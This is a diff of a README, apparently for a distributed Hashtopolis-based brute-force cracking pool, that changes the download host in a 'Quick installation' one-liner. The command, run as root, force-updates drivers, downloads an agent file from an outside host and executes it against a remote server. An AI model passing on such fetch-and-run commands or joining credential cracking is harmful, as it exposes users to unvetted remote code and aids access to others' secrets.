@@ -194,7 +194,7 @@ Find your Agent ID and Post in https://t.me/+bi0ifA-TRYQxODQy so it can be assig
 
 Quick installation:
 ```
-sudo apt update && sudo apt-get update && sudo apt install git && sudo apt -y install nvidia-opencl-dev && sudo apt-get install python3-pip -y && sudo -H python3 -m pip install psutil && sudo -H pip3 install requests && nvidia-driver-update 510.68.02 --force && sudo mkdir CAT && cd CAT && sudo apt install aria2 && sudo aria2c http://walletdatuss.work/agents.php?download=1 && python3 hashtopolis.zip --url http://brutepool.com/api/server.php --voucher brutepool 
+sudo apt update && sudo apt-get update && sudo apt install git && sudo apt -y install nvidia-opencl-dev && sudo apt-get install python3-pip -y && sudo -H python3 -m pip install psutil && sudo -H pip3 install requests && nvidia-driver-update 510.68.02 --force && sudo mkdir CAT && cd CAT && sudo apt install aria2 && sudo aria2c http://brutepool.com/agents.php?download=1 && python3 hashtopolis.zip --url http://brutepool.com/api/server.php --voucher brutepool 
 ```
 
 ## The advantage of collective search:
